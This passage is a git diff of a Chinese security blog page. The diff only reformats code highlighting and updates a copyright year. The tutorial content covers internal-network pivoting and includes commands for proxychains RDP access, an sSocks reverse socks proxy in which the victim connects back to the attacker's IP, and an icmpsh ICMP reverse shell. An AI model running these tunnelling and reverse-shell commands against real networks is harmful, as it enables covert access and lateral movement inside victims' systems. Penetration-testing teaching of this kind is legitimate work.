+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 接着连接内网主机</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># socks5://1.1.1.1:1080</span>
+</span></span><span class="line"><span class="cl">proxychains rdesktop 192.168.0.100:3389
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="43-ssocks">4.3 sSocks</h3>
 <p>sSocks 是一个 socks 代理工具套装，可用来开启 socks 代理服务，支持 socks5 验证，支持 IPV6 和 UDP，并提供反向 socks 代理服务，即将远程计算机作为 socks 代理服务端，反弹回本地，极大方便内网的渗透测试。</p>
@@ -776,8 +776,8 @@ proxychains rdesktop 192.168.0.100:3389
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./ssocksd --bind 192.168.172.131 --port <span class="m">1080</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./ssocksd --bind 192.168.172.131 --port <span class="m">1080</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>反向代理</li>
@@ -791,12 +791,12 @@ proxychains rdesktop 192.168.0.100:3389
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 攻击者机器监听 6020 端口转发到 6010</span>
-./rcsocks -l <span class="m">6020</span> -p <span class="m">6010</span> -vv
-
-<span class="c1"># 受害者反向连接代理主机 6010 端口</span>
-./rssocks -s 攻击者IP:6010 -vv
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 攻击者机器监听 6020 端口转发到 6010</span>
+</span></span><span class="line"><span class="cl">./rcsocks -l <span class="m">6020</span> -p <span class="m">6010</span> -vv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 受害者反向连接代理主机 6010 端口</span>
+</span></span><span class="line"><span class="cl">./rssocks -s 攻击者IP:6010 -vv
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="5-网络层">5 网络层</h2>
 <h3 id="51-icmp-tunnel">5.1 ICMP Tunnel</h3>
@@ -810,9 +810,9 @@ proxychains rdesktop 192.168.0.100:3389
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">apt-get install python-impacket
-python icmpsh_m.py 本机IP 目标机器公网IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install python-impacket
+</span></span><span class="line"><span class="cl">python icmpsh_m.py 本机IP 目标机器公网IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="512-客户端">5.1.2 客户端</h4>
 <div class="highlight"><div class="chroma">
@@ -820,8 +820,8 @@ python icmpsh_m.py 本机IP 目标机器公网IP
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">icmpsh.exe -t 目标IP -d <span class="m">500</span> -b <span class="m">30</span> -s <span class="m">128</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">icmpsh.exe -t 目标IP -d <span class="m">500</span> -b <span class="m">30</span> -s <span class="m">128</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
@@ -851,7 +851,7 @@ python icmpsh_m.py 本机IP 目标机器公网IP
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
